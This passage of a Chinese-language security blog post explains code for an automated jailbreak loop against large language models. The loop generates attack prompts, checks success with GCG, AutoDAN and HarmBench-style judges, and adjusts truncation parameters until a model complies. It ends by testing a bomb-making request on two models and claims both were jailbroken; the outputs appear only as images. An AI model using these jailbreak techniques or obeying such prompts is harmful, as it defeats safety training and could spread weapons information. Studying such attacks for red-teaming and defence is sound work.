+<p>整个脚本的目的是根据用户的输入参数，选择并加载不同的语言模型，以便进行文本生成或其他处理任务。在调试模式下，脚本会直接生成提示词；在非调试模式下，会根据配置文件加载并配置模型。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232308-31ae703c-9d1c-1.png"/><br/>
+这段代码加载行为数据，并对每个行为进行多次攻击测试：</p>
+<ol>
+<li>
+<p><strong>加载行为数据</strong>：</p>
+<ul>
+<li>
+<code>behaviors = json.load(open(f'../../data/behaviors.json', 'r'))</code> 从指定路径的 JSON 文件中加载行为数据。</li>
+<li>
+<code>print(len(behaviors))</code> 打印行为数据的总长度。</li>
+<li>
+<code>behaviors = behaviors[args.start:args.end]</code> 根据输入参数，截取部分行为数据。</li>
+</ul>
+</li>
+<li>
+<p><strong>初始化字典和CSV相关变量</strong>：</p>
+<ul>
+<li>
+<code>dict_behaviors</code> 和 <code>dict_prompt</code> 初始化为空字典，用于存储行为和提示数据。</li>
+<li>
+<code>csv_title</code> 定义CSV文件的标题行。</li>
+<li>
+<code>csv_result</code> 初始化为空列表，用于存储CSV文件的数据。</li>
+</ul>
+</li>
+<li>
+<p><strong>初始化列表</strong>：</p>
+<ul>
+<li>
+<code>success_list</code> 和 <code>query_list</code> 初始化为空列表，用于存储成功的记录和查询记录。</li>
+</ul>
+</li>
+<li>
+<p><strong>处理每个行为</strong>：</p>
+<ul>
+<li>
+<code>for idx, behavior in tqdm(enumerate(behaviors)):</code> 使用 <code>tqdm</code> 包装 <code>enumerate</code>，显示进度条，遍历每个行为。</li>
+<li>
+<code>attack_kwargs = {"toxic_trunc": 0.5, "benign_trunc": 0.5}</code> 定义攻击参数。</li>
+</ul>
+</li>
+<li>
+<p><strong>多次攻击测试</strong>：</p>
+<ul>
+<li>
+<code>for step in range(args.T):</code> 对每个行为进行多次（<code>args.T</code>次）攻击测试。<ul>
+<li>根据 <code>args.model</code> 决定使用哪个模型生成提示：<ul>
+<li>如果模型是 <code>gpt-4</code>：<ul>
+<li>
+<code>prompt = gpt4_gen(behavior, verbose=args.verbose, **attack_kwargs)</code> 生成提示。</li>
+<li>打印分割线并生成响应 <code>response = chat_with_gpt(prompt, args.model)</code>。</li>
+<li>打印响应和分割线。</li>
+</ul>
+</li>
+<li>如果模型是 <code>gpt-3.5</code>：<ul>
+<li>类似 <code>gpt-4</code> 的处理方式，使用 <code>llama_gen</code> 生成提示。</li>
+</ul>
+</li>
+<li>对于其他模型（假设是Llama）：<ul>
+<li>
+<code>prompt = llama_gen(behavior, **attack_kwargs)</code> 生成提示。</li>
+<li>使用 <code>conv_prompt</code> 格式化测试用例。</li>
+<li>使用分词器 <code>tokenizer</code> 处理输入数据，并将输入ID转换为适合设备（CUDA或CPU）的张量。</li>
+<li>打印分割线，接下来应该是生成响应的代码。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>总之，这段代码的主要作用是对从文件中加载的行为数据进行多次攻击测试，并根据不同的模型生成提示和响应。生成的响应和相关信息将被存储到一个CSV文件中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232320-38b84c54-9d1c-1.png"/><br/>
+这段代码继续对每个行为进行多次攻击测试，并生成响应、检查系统突破情况、记录结果：</p>
+<ol>
+<li>
+<p><strong>生成响应</strong>：</p>
+<ul>
+<li>
+<code>print('*' * 20)</code> 打印分割线，用于日志记录。</li>
+<li>
+<code>outputs = model.generate(input_ids, max_new_tokens=400, do_sample=False)</code> 使用模型生成响应，最大新生成的令牌数量为400，且不进行采样（即使用贪婪搜索）。</li>
+<li>
+<code>response = tokenizer.decode(outputs[0][num_input_tokens:], skip_special_tokens=True)</code> 解码模型生成的输出，跳过特殊标记，只提取生成的响应部分。</li>
+<li>打印生成的响应及分割线。</li>
+</ul>
+</li>
+<li>
+<p><strong>检查系统突破</strong>：</p>
+<ul>
+<li>
+<code>jailbreak_check_GCG, jailbreak_check_AutoDAN, em = jailbreak_check(behavior, response, args.em_t)</code> 使用<code>jailbreak_check</code>函数检查响应是否突破系统，返回GCG检查结果、AutoDAN检查结果和EM值。</li>
+<li>
+<code>harmfulbench_result = predict([behavior], [response])[0]</code> 使用<code>predict</code>函数检查响应是否通过<code>harmfulbench</code>测试，返回第一个结果。</li>
+<li>将当前步骤的结果添加到<code>csv_result</code>列表中。</li>
+</ul>
+</li>
+<li>
+<p><strong>调整攻击参数</strong>：</p>
+<ul>
+<li>如果GCG检查失败：<ul>
+<li>打印失败日志信息。</li>
+<li>减少<code>toxic_trunc</code>参数的值，以调整攻击的强度。</li>
+<li>确保<code>toxic_trunc</code>的值不低于0.001。</li>
+</ul>
+</li>
+<li>如果EM值检查失败：<ul>
+<li>打印失败日志信息。</li>
+<li>增加<code>benign_trunc</code>参数的值，以调整攻击的强度。</li>
+<li>确保<code>benign_trunc</code>的值不高于0.999。</li>
+</ul>
+</li>
+<li>如果<code>harmfulbench</code>测试失败：<ul>
+<li>打印失败日志信息。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>记录成功案例</strong>：</p>
+<ul>
+<li>如果GCG检查、EM值检查和<code>harmfulbench</code>测试全部通过：<ul>
+<li>打印通过检查的日志信息，包括当前步骤总数。</li>
+<li>将当前行为的索引和步骤数添加到<code>success_list</code>和<code>query_list</code>中。</li>
+<li>跳出当前行为的攻击循环（<code>break</code>），进行下一个行为的测试。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>总结：<br/>
+这段代码对加载的行为数据进行多次攻击测试，生成响应并检查系统是否被越狱。根据检查结果，调整攻击参数并记录测试结果和成功案例。最终，所有结果将被保存到CSV文件中，以便进一步分析和处理。</p>
+<h2 data-content="1" id="490a57b87699f3a3cf5d7b8f2b17a091">攻击</h2>
+<p>现在我们以如何制作炸弹为例进行测试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232331-3f1de3a6-9d1c-1.png"/><br/>
+得到生成的prompt如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232339-43e574ee-9d1c-1.png"/><br/>
+我们将其复制后，任意选择两个大模型进行测试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232346-48414694-9d1c-1.png"/><br/>
+上图中的左、右分别是两个大模型，测试结果如下所示</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232404-52dc1e08-9d1c-1.png"/><br/>
+左边的答案翻译后如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232415-591bd47a-9d1c-1.png"/><br/>
+右边的答案翻译后如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232422-5d8ff54a-9d1c-1.png"/><br/>
+可以看到是成功越狱了这两个大模型。</p>
+<h1 data-content="1" id="856d0f5101ff4f4fac6ceb46263b178b">参考</h1>
+<p>1.<a href="https://arxiv.org/pdf/2211.09527" target="_blank">https://arxiv.org/pdf/2211.09527</a></p>
+<p>2.<a href="https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/" target="_blank">https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/</a></p>
+<p>3.<a href="https://arxiv.org/abs/2402.18104" target="_blank">https://arxiv.org/abs/2402.18104</a></p>
+<p>4.<a href="https://mistral.ai/news/mixtral-of-experts/" target="_blank">https://mistral.ai/news/mixtral-of-experts/</a></p>
+<p>5.<a href="https://ai.google.dev/gemma" target="_blank">https://ai.google.dev/gemma</a></p>
+</div>
+</div>
